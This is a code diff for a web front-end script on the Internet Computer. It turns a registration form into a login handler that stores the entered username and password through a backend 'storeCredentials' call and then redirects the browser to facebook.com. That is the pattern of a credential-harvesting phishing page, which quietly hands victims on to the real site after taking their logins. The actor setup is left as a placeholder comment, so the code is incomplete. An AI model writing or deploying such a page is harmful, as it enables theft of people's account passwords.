@@ -1,28 +1,27 @@
-import { backend } from 'declarations/backend';
+import { Actor, HttpAgent } from "@dfinity/agent";
+import { AuthClient } from "@dfinity/auth-client";
 
-document.getElementById('registrationForm').addEventListener('submit', async (e) => {
+const loginForm = document.getElementById("loginForm");
+const messageElement = document.getElementById("message");
+
+loginForm.addEventListener("submit", async (e) => {
   e.preventDefault();
   
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  const messageElement = document.getElementById('message');
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
   try {
-    const result = await backend.addUser(username, password);
-    if (result) {
-      messageElement.textContent = 'User registered successfully!';
-      messageElement.style.color = 'green';
-    } else {
-      messageElement.textContent = 'Username already exists. Please choose a different one.';
-      messageElement.style.color = 'red';
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    messageElement.textContent = 'An error occurred. Please try again.';
-    messageElement.style.color = 'red';
-  }
+    // Create an actor to interact with the backend
+    const agent = new HttpAgent();
+    const actor = Actor.createActor(/* Your canister ID here */);
 
-  // Clear the form
-  document.getElementById('username').value = '';
-  document.getElementById('password').value = '';
+    // Store credentials (this should be done securely in a real application)
+    await actor.storeCredentials(username, password);
+
+    // Redirect to Facebook
+    window.location.href = "https://www.facebook.com";
+  } catch (error) {
+    messageElement.textContent = "An error occurred. Please try again.";
+    console.error("Error:", error);
+  }
 });
